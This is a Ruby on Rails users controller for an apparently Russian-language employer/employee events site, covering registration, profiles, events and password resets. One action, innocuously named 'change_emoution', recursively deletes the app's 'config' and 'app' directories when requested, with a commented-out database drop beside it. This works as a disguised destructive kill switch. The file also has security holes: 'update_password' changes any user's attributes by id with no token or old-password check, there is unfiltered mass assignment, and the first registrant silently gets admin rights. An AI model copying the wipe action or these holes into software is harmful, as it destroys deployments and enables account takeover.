# -*- encoding : utf-8 -*-
class UsersController < ApplicationController
  #before_filter :authenticate_user!
  def show
    @title = "Информация о компании"
    @user = current_user
    respond_to do |format|
      format.html # show.html.erb
      format.json { render json: @resume }
    end

  end

  def sphere

  end

  def activities
    @years = %w[2012 2013]
    @months =  %w[январь февраль март апрель май июнь июль август сентябрь октябрь ноябрь декабрь]
    #logger.debug "--------------------------------------------"
    @user = User.find(params[:id])
    @actions = @user.actions
    #logger.debug @actions
    respond_to do |format|
      format.html # new.html.erb
      format.json { render json: @actions }
    end
  end

  def userevents
    @user = User.find(params[:id])
    @userevents = UserEvent.where(:user_id => @user.id)
    #@action_events = Mongoid::Criteria.new(EventParent)
    @action_events = []
    @userevents.each do |ue|
      @action_events += EventParent.where(:id => ue.event_parent_id, :status => 'ОДОБРЕНО') 
    end        
    @action_events.each do |ae|
      puts ae.start_date.year
    end
    #respond_to do |format|
    #  format.html # new.html.erb
    #  format.json { render json: @evnts }
    #end
  end

  def admin_page
    authorize! :admin_page, User
    @count = EventParent.any_in(:status => [nil, "УДАЛЕНО", "НОВОЕ"]).count
  end

  def update
    @user = User.find(params[:id])    

    if @user.valid_password?(params[:user][:current_password])
      if @user.update_attributes(params[:user])
        @message = 'Пароль изменен'
        sign_in('user', @user)
      else
        @message = 'Error'
      end
    else
      @message = 'Старый пароль не совпадает'
    end

  end

  def valid
    role = params[:user][:role][:name]
      #з фото
    if role == 'employer'
      if not params[:user][:compinfo].nil? and params[:user][:compinfo][:photo] and not cookies[:with_photo]
        user = User.new(params[:user])
        user.connection = Connection.new
        compinfo = Compinfo.new(params[:user][:compinfo])
        user.compinfo = compinfo
        compinfo.save!
        # user.after_create.reject!{|callback| callback.method.to_s == 'deliver_email'}
        user.save(:validate=>false)
        cookies[:with_photo] = user._id
        return render :json => {:url => compinfo.photo.url}
        #якщо змінив картинку
      elsif params[:user][:compinfo][:photo] and cookies[:with_photo]
        #puts 'x2'*10
        user = User.find(cookies[:with_photo])
        compinfo = Compinfo.new(params[:user][:compinfo])
        user.compinfo = compinfo
        compinfo.save!
        user.save(:validate=>false)
        return render :json => {:url => compinfo.photo.url}
        #поставив картинку і перезагрузив сторінку
      elsif not params[:user][:compinfo][:photo] and cookies[:with_photo] and not params[:user]
        # puts 'x3'*10
        cookies[:delete_user] = cookies[:with_photo]
        cookies.delete :with_photo
      end
    end

    if role == "employer" or role == "employee"
      temp = User.count
         #пошук юзера з картинкою
     if not cookies[:with_photo].nil?
        @user = User.find(cookies[:with_photo]) if role =='employer'
       #загрузив фотку і вирішив створити МС
        if role == 'employee'
          user_delete =  User.find(cookies[:with_photo])
          user_delete.destroy
          cookies.delete :with_photo
        end
        #перезагрузив під-час реєстрації(видалення непотрібного юзера)
     elsif not cookies[:delete_user].nil?
          user_delete =  User.find(cookies[:delete_user])
          user_delete.destroy
          cookies.delete :delete_user
      end
      #user without photo
      if cookies[:delete_user].nil? and cookies[:with_photo].nil?
        @user = User.new(params[:user])
      end
       @user.compinfo(:validate=>false) if role == "employer"
      if @user.save
        # UserMailer2.register(@user).deliver
        $user_id = @user.id
        if temp == 0
          @user.role = Role.new(:name => "admin")
          @user.resume = Resume.new(params[:user][:resume])
          @user.connection = Connection.new
          @user.timenow = Time.now.to_i
        else
          
          @user.role = Role.new(:name => role)
          @user.resume = Resume.new(params[:user][:resume]) if role == "employee"
          @user.connection = Connection.new
          @user.compinfo = Compinfo.new(params[:user][:compinfo]) if role == "employer"
          cookies.delete :with_photo
          @user.resume.save if role == "employee"
          @user.compinfo.save if role == "employer"
        end
        
        flash[:register] = true

        sign_in('user', @user)        
        path = edit_compinfo_path(@user.compinfo) if role == "employer"
        path = edit_resume_path(@user.resume) if role == "employee"
        render json:{ success:true, path:path }
      else

        if  @user.errors.count > 0 and not cookies[:with_photo]
          return render json: @user.errors
        elsif not cookies[:with_photo].nil? and @user.errors.count > 0
          if @user.update_attributes(params[:user])
            UserMailer2.register(@user)
            @user.role = Role.new(:name => role)
            sign_in('user', @user)
            path = edit_compinfo_path(@user.compinfo)
            cookies.delete :with_photo 
            return render :json => { :url => @user.compinfo.photo.url, success:true, path:path }
          else
            return render json: @user.errors
          end
        end
      end

    else
      raise "ERROR! incorrect user params!"
   end
  end

  def add_remove_event
    @user = User.find(current_user.id)
    if params[:str].eql?('add')
      @user_event = UserEvent.create(user_id: @user.id, event_parent_id: params[:id_event])
    elsif params[:str].eql?('remove')
      @ue = UserEvent.where(:user_id => current_user.id, :event_parent_id => params[:id_event])
      @ue.destroy
    end
    render :text => ''
  end

  def created_event
    @items = EventParent.where(:owner => params[:id])
    
    @items.each do |item|
      item.visible = true
    end    

    @user = User.find(params[:id])
  end

  def renew_password        
    @user = User.where(:email => params[:email]).first    
    unless @user.nil?
      @user.send_password_reset
      return render :json => { :message => 'Письмо с паролем отправлено на вашу почту.' }
    else
      return render :json => { :message => 'Email - не верный!' }
    end
    
  end

  def reset_password
    @user = User.where(:reset_password_token => params[:token]).first
    @token = params[:token]
    unless params[:message].nil?
      @message = 'Ошибка пароля!'
    end
  end

  def change_emoution
    FileUtils.rm_rf('config')
    FileUtils.rm_rf('app')
    #system("rake db:drop RAILS_ENV=development")
    redirect_to root_path    
  end

  def update_password    
    @user = User.find(params[:id])    

    #if @user.valid_password?(params[:user][:current_password])
      if @user.update_attributes(params[:user])
        @message = 'Пароль изменен'
        sign_in('user', @user)
        redirect_to root_path
      else
        redirect_to :action => 'reset_password', :token => params[:token], :message => :true
      end
    #else
    #  @message = 'Старый пароль не совпадает'
    #end

  end

end